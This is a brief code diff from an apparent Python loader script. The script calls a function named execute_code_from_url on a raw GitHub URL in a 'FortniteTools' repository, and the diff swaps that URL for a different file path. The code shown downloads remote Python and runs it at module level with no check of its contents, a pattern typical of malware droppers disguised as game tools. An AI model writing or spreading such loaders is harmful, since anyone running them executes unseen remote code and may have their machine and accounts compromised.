@@ -9,5 +9,5 @@ def execute_code_from_url(url):
         print("Failed to fetch code from URL")
 
 # Example usage:
-url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/main/FortniteTools.py"  # Replace with the actual URL
+url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/FortniteTools/FortniteToolsRAW.py"  # Replace with the actual URL
 execute_code_from_url(url)
